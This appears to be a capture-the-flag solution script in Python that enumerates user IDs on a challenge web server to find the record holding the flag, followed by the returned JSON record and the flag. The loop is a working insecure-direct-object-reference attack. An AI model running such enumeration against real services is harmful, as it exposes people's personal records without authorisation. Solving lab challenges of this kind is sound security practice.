import requests
url = 'http://139.162.5.230:10312/user/'
session = requests.session()
for _ in range(99):
    r = session.get(url + str(_))
    if 'HZU18' in r.text:
        print(r.text)

# OUTPUT : {"id":46,"firstName":"Braulio","lastName":"Carter","email":"Pierre_Schmeler89@hotmail.com","phone":"(203) 981-3504","address":"7631 Sigurd Wells","city":"Burlington","state":"Vermont","zip":"02571-1129","company":"HZU18{9b36fa+NICE_LIST_0e7635b84cefe035}","avatar":"https://cloudflare-ipfs.com/ipfs/Qmd3W5DuhgHirLHGVixi6V76LhCkZUz6pnFt5AJBiyvHye/avatar/400.jpg"}
# FLAG : HZU18{9b36fa+NICE_LIST_0e7635b84cefe035}